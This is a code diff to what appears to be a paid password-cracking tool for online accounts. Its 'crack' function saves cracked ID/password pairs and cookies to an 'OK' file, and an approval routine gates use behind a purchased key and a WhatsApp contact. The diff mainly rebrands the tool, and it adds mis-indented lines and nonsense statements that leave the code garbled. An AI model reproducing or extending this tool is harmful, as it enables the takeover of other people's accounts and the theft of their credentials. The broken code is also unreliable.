@@ -538,20 +538,16 @@ def crack(idf,pwv):
 				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
 				cek_apk(session,coki)
 				break
-				
-			else:
-				continue
-		except requests.exceptions.ConnectionError:
-			time.sleep(31)
-			
+									        break
+				            
 			else:
 				continue
 		loop+=1
 	except requests.exceptions.ConnectionError:
 		time.sleep(20)
 	except Exception as e:
-		#print(e
-			pass
+		#print(e)
+		pass
 #------------------[  approval  ]-------------------#        
 def newkey():
     ff = requests.get(link)
@@ -590,7 +586,7 @@ def approval():
         Trial(sec[1])
     if 'Napv' in sec:
       boos = random.choice([P, M, H, K, B, U, O, N])
-      print(f" \033[1;32m[\033[1;31m√\033[1;32m] YOUR KEY 🔐 \033[1;37m : {boos}DJALIL_MK+\033[1;32m"+sec.replace('Napv',''))
+      print(f" \033[1;32m[\033[1;31m√\033[1;32m] YOUR KEY 🔐 \033[1;37m : {boos}VIPERS+\033[1;32m"+sec.replace('Napv',''))
       print('\033[1;34m─────────────────────────────────────────────')
       print(' \033[1;32m[\033[1;31m–\033[1;32m] You are not premuim user first buy premuim ')
       print('\033[1;34m-─────────────────────────────────────────────')
@@ -603,7 +599,7 @@ def approval():
       print(" \033[1;32m[\033[1;31m–\033[1;32m] Note : \033[1;32mPAY AND TRY")
       print('\033[1;34m─────────────────────────────────────────────')
       input(' \033[1;32m[\033[1;31m–\033[1;32m] Press Enter To Go To WhatsApp')
-      os.system('am start https://wa.me/+213783848793')
+      os.system('am start https://wa.me/+213655643510')
       approval()
     if sec=='Apv':menu()
     else:exit()
@@ -617,5 +613,7 @@ while True: requests
 raise KeyError ("XD")
 "HaN".FuCk
 raise SystemExit
-open('').
+open('').close()
+
+
 
